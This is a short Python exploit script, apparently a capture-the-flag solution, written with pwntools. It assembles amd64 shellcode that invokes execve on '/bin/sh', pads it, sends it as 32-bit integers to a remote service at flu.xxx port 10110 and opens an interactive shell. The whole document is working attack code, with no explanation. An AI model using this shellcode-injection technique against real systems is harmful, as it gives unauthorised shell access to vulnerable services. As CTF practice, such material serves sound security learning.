from pwn import *

context.arch = 'amd64'

sc = asm(f'''
          add byte ptr [rsp], al
          call TAG
          .byte 0x01
          TAG:
          pop rdi
          push 0
          xor eax, eax
          nop
          nop
          push rsp
          nop
          mov al, 0x3b
          pop rdx
          add dil, 0x5b
          push rdi
          push rsp
          pop rsi
          pop rbp
          syscall
          ''')+b'\xff\x60'+b'\xff\xff\x20\x60'*0x10 + b'\xff\xff/bin/sh\x00'

sc = sc.ljust(0x200,b'\xff')

r = remote('flu.xxx', 10110)
for i in range(0x80):
    r.sendline(str(u32(sc[i*4:i*4+4])).encode())
r.interactive()
